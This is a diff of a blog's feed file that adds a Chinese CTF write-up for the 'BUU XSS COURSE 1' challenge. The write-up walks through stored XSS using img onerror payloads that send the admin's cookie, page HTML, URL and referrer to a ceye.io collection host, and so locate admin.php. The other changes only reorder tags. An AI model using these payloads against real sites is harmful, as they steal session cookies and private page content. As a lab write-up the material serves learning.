@@ -4,6 +4,27 @@
   
   
   <entry>
+    <title>BUU XSS COURSE 1</title>
+    <link href="/2023/10/14/BUU-XSS-COURSE-1/"/>
+    <url>/2023/10/14/BUU-XSS-COURSE-1/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>回忆一下简单XSS。</p><a id="more"></a><hr><h3 id="注入JavaScript"><a href="#注入JavaScript" class="headerlink" title="注入JavaScript"></a>注入JavaScript</h3><p>先看到题目的界面：</p><p><img src="/css/images/BUU-XSS-COURSE-1/01.png" srcset="/img/loading.gif" alt=""></p><p>存在一个吐槽页面和一个登录页面，推测解法为吐槽界面提交HTML代码，由后端携带管理员身份信息的headless浏览器访问造成存储型XSS，然后外带管理员cookie，最后伪装成管理员身份并访问网站找到敏感信息。</p><p>首先尝试直接插入script标签：</p><pre><code class="HTML">&lt;script&gt;location.href=`http://xxxxxx.ceye.io`&lt;/script&gt;</code></pre><p>发现没有回显，访问网站给出的界面后发现script标签里的代码没有正常执行，要换种方法插入JS。</p><p>尝试使用img标签事件插入JavaScript代码：</p><pre><code class="HTML">&lt;img src=x onerror=&#39;location.href=`http://xxxxxx.ceye.io`&#39;&gt;</code></pre><p>能够正常看到回显，JavaScript插入成功：</p><p><img src="/css/images/BUU-XSS-COURSE-1/02.png" srcset="/img/loading.gif" alt=""></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>首先尝试把cookie打出来，简单拼接一下跳转URL：</p><pre><code class="HTML">&lt;img src=x onerror=&#39;location.href=`http://xxxxxx.ceye.io/?`+document.cookie&#39;&gt;</code></pre><p>得到管理员cookie：</p><p><img src="/css/images/BUU-XSS-COURSE-1/03.png" srcset="/img/loading.gif" alt=""></p><p>直接在chrome控制台中修改cookie：</p><p><img src="/css/images/BUU-XSS-COURSE-1/04.png" srcset="/img/loading.gif" alt=""></p><p>发现没有什么不同，需要继续深入。</p><h3 id="HTML页面"><a href="#HTML页面" class="headerlink" title="HTML页面"></a>HTML页面</h3><p>怀疑管理员cookie不是管理员身份的标识，管理员身份可能要求内网访问，思路转向通过XSS实现CSRF，首先把管理员所看到的页面源码打出来：</p><pre><code class="HTML">&lt;img src=x onerror=&#39;location.href=`http://hdftk4.ceye.io/?`+escape(escape(document.documentElement.outerHTML)).slice(0,1000)&#39;&gt;</code></pre><p>看到编码后的页面源代码：</p><p><img src="/css/images/BUU-XSS-COURSE-1/05.png" srcset="/img/loading.gif" alt=""></p><p>因为长度和字符的关系，需要进行长度截断和双重URL编码，将页面源代码全部打出来后发现页面跟普通用户一致，需要再次转换思路。</p><h3 id="源地址"><a href="#源地址" class="headerlink" title="源地址"></a>源地址</h3><p>由于ceye看不到请求的HTTP HEADERS，所以需要特别打一次：</p><pre><code class="HTML">&lt;img src=x onerror=&#39;location.href=`http://hdftk4.ceye.io/?`+escape(escape(location.href)).slice(0,1000)&#39;&gt;</code></pre><p>但是发现URL只是一个普通的用于查看提交数据的页面：</p><p><img src="/css/images/BUU-XSS-COURSE-1/06.png" srcset="/img/loading.gif" alt=""></p><p>猜测其之前存在一个总览提交数据的页面：</p><pre><code class="HTML">&lt;img src=x onerror=&#39;location.href=`http://hdftk4.ceye.io/?`+escape(escape(document.referrer)).slice(0,1000)&#39;&gt;</code></pre><p>看到admin.php：</p><p><img src="/css/images/BUU-XSS-COURSE-1/07.png" srcset="/img/loading.gif" alt=""></p><p>访问，得到flag：</p><p><img src="/css/images/BUU-XSS-COURSE-1/08.png" srcset="/img/loading.gif" alt=""></p><hr>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUUCTF CMD</title>
     <link href="/2023/10/13/BUUCTF-CMD/"/>
     <url>/2023/10/13/BUUCTF-CMD/</url>
@@ -2765,9 +2786,9 @@
       
       <tag>Web</tag>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>PHPFPM</tag>
       
@@ -3391,9 +3412,9 @@
       
       <tag>Web</tag>
       
-      <tag>复现</tag>
-      
       <tag>NodeJS</tag>
+      
+      <tag>复现</tag>
       
       <tag>前端</tag>
       
@@ -3732,9 +3753,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>docker</tag>
       
@@ -3780,9 +3801,9 @@
     
     <tags>
       
-      <tag>复现</tag>
-      
       <tag>二进制</tag>
+      
+      <tag>复现</tag>
       
       <tag>Winrar</tag>
       
